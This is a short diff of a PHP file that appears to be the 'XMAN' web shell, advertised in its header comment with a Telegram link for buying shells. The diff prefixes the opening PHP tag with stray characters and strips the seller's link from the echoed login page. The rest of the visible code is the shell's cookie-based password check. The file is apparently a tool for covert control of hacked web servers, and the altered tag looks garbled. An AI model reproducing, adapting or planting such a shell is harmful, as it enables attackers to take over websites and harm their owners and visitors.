@@ -1,4 +1,4 @@
-﻿﻿<?php
+﻿SS<?pHp
 /* XMAN PHP ver 1.4 [ buy shells https://t.me/molasazy ] */
 
 // Configuration — do not change manually!
@@ -559,7 +559,7 @@ if ($auth['authorize']) {
 		}
 	}
 	if (!isset($_COOKIE[$auth['cookie_name']]) OR ($_COOKIE[$auth['cookie_name']]!=$auth['login'].'|'.md5($auth['password']))) {
-		echo 'text: https://t.me/molasazy
+		echo '
 <!doctype html>
 <html>
 <head>
